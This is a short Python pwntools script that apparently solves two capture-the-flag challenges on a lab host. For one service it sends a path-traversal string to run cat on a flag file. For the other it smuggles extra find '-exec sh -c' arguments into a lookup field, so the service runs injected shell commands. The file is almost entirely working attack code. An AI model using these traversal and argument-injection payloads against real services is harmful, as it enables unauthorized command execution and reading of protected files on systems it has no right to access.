import sys, socket
import os
from pwn import *

IP = "10.0.10.10"
PORT = 1102

context.log_level = "DEBUG"

#if (len(sys.argv) == 3):
#	IP = sys.argv[1]
#	PORT = int(sys.argv[2])

connection = 0
local = False

if(sys.argv[1] == "r"):
    connection = remote(IP,PORT)
elif(sys.argv[1] == "l"):
   connection = process('/bin/sh')
   local = True
else:
    print("No valid arguments")

def main(): 				#Jailbreak
	if PORT == 1103:
		catCommand = "../../../../../../bin/cat"
		flagCommand = "flag"
		connection.recvuntil("command: ")
		connection.sendline(catCommand)
		connection.recvuntil("parameter: ")
		connection.sendline(flagCommand)
		flag = connection.recv(4096)
		print flag
	if PORT == 1102:
		if local:
            		connection.sendline('./findfile/findfile')
        	connection.recvuntil("lookup: ")
        	connection.sendline("afile -exec find flag {} + -exec sh -c 'cat flag' {} +")#" cat flag {} +") #-D stat") #-exec cat")
        	p = connection.recvall()
        	p = p.split('\n')[4] 
        	print p

main()
